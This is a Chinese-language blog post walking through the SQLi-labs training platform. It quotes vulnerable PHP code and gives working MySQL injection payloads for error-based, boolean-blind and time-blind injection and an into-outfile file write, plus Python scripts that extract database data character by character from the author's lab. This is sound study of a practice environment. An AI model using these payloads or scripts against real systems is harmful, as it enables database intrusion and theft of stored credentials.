---
id: 4461
title: 漏洞测试平台——SQLi-labs
date: 2017-05-31T07:18:04+00:00
author: admin
layout: post
guid: http://blog.ikow.cn/?p=4461
permalink: '/%e6%bc%8f%e6%b4%9e%e6%b5%8b%e8%af%95%e5%b9%b3%e5%8f%b0-sqli-labs/'
categories:
  - security
tags:
  - sqli
  - sqli-labs
  - sql注入
---
SQLi-labs是个专门用来学习SQL注入的开源漏洞测试平台，基于php+mysql开发，所以里面涉及的SQL注入都是mysql语法。

下载的地址是https://github.com/Audi-1/sqli-labs

下载安装按照readme里面要求即可，这里不多废话。下面是每个题目的具体分析：

1、error based string sqli

首先是源码：

<pre class="brush: plain; title: ; notranslate" title="">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
	if($row)
	{
  	echo "&lt;font size='5' color= '#99FF00'&gt;";
  	echo 'Your Login name:'. $row['username'];
  	echo "
";
  	echo 'Your Password:' .$row['password'];
  	echo "&lt;/font&gt;";
  	}
	else 
	{
	echo '&lt;font color= "#FFFF00"&gt;';
	print_r(mysql_error());
	echo "&lt;/font&gt;";  
	}
</pre>

我们可以看到当mysql语句正确执行的时候，应用会打印结果，但是没有正确执行的时候会打印错误，所以这里我们并不能像有回显位注入那样直接注入mysql语句。我们需要利用报错信息进行注入。

原理其实比较简单，一般都是利用某函数X    比如X(exp)  mysql函数在执行的时候会先执行函数里面的exp，获取返回值，然后再把exp的返回值作为参数给X进行执行，当exp的返回值不符合X的传参要求时，会导致query错误，打印出错误。

直接贴上一个老毛子整理的error based的cheat sheet：https://blackfan.ru/mysql_game/

构造exp：‘|polygon((select*from(select name_const(version(),1))x))%23

2、error based integer sqli

原理同一，只不过是注入点的变量是integer

exp：|polygon((select*from(select name_const(version(),1))x))%23

3、注入点变量外有单引号和括号，在exp中添加对应的符号即可：

exp：&#8217;)|polygon((select*from(select name_const(version(),1))x))%23

4 、双引号加括号的error based 注入，变下exp即可：

exp: &#8220;)|polygon((select*from(select name_const(version(),1))x))%23

5、string 单引号注入同第一题

exp: &#8216; |polygon((select*from(select name_const(version(),1))x))%23

6、string 双引号注入

exp: &#8220;|polygon((select*from(select name_const(version(),1))x))%23

7、我们先看下源码：

> <span class="pl-c1">error_reporting</span>(<span class="pl-c1"></span>);

这句话表示不再显示具体错误，只会显示“<span style="color: #808080; font-size: medium;">You have an error in your SQL syntax“</span>，所以这里我们不能用前几题的error based注入，根据标题的提示“dump into outfile&#8221;, 由于我权限设置的原因，apache用户无法写入文件，这里直接给出exp了：

1&#8242;)) union select 1,2,3 into outfile &#8220;/tmp/test.txt&#8221;  –-+

8、布尔型的盲注，这里我们通过and 1=1、and 1=2进行判断：

?id=1&#8217;+and+1=1&#8211;+ 和id=1相同回显

?id=1&#8217;+and+1=2&#8211;+ 和id=1不同回显

证明这里的and后面的语句被执行了，这里我们需要利用一些函数结合脚本来获取数据库信息：

<pre class="brush: plain; title: ; notranslate" title="">import requests
payload = '0123456789.abcdefghijklmnopqrstuvwxyz'

for posi in range(20):
    for asc in payload:
        url = "http://tools.ikow.cn/sqli-labs/Less-8/?id=1\'+AND ASCII(SUBSTRING(version(),%d,1))=%d--+" \
              % (posi, ord(asc))
        result = requests.get(url)
        #print url
        if "You are in" in result.content:
            print asc,
</pre>

9、我们看下第九题的源码（https://github.com/Audi-1/sqli-labs/blob/master/Less-9/index.php）发现sql查询不管是正确还是错误都会返回相同的信息，这个时候我们不能通过第八题中基于回显进行注入了，这里我们要利用mysql中的一些延时函数进行注入。这题是考察基于时间的盲注

mysql中主要有sleep和benchmark两个函数，sql server中有wait for time和wait for delay两个。时间盲注大体上和布尔型盲注相同，这里我们判断语句是否执行是通过mysql数据库延时返回造成我们的http响应延时。

这里直接上写好的脚本，逻辑很简单：

<pre class="brush: plain; title: ; notranslate" title="">import requests
import time
payload = '0123456789.abcdefghijklmnopqrstuvwxyz'

for posi in range(20):
    for asc in payload:
        FirstRun = int(time.time())
        url = "http://tools.ikow.cn/sqli-labs/Less-9/?id=1\'" \
              "+AND+IF(ASCII(SUBSTRING(version(),%d,1))=%d,SLEEP(5),0)--+" \
              % (posi, ord(asc))
        result = requests.get(url)
        SecondRun = int(time.time())
        #print url
        #print SecondRun,FirstRun
        if SecondRun - FirstRun &gt; 1:
            print asc,
</pre>

&nbsp;

11、同样是基于时间的盲注，不过是10中的单引号换成了双引号，简单该下脚本即可

12、基于报错的post双引号加括号注入

exp：uname=admin&passwd=&#8221;)/updatexml(0,repeat(version(),2),0)#

13、基于报错的post单引号加括号注入

exp: uname=admin&passwd=&#8217;)/updatexml(0,repeat(version(),2),0)#

14、基于报错的post双引号注入

exp: uname=admin&passwd=&#8221;/updatexml(0,repeat(version(),2),0)#

15、post 布尔型盲注

exp script：

<pre class="brush: plain; title: ; notranslate" title="">import requests
payload = '0123456789.abcdefghijklmnopqrstuvwxyz'

for posi in range(20):
    for asc in payload:
        url = "http://tools.ikow.cn/sqli-labs/Less-15/"
        payload = "admin\' AND ASCII(SUBSTRING(version(),%d,1))=%d#" \
              % (posi, ord(asc))
        data = {'uname':'admin', 'passwd': payload}
        result = requests.post(url,data=data)
        #print data
        if "flag.jpg" in result.content:
            print asc,
</pre>

16、post 时间盲注

&nbsp;

&nbsp;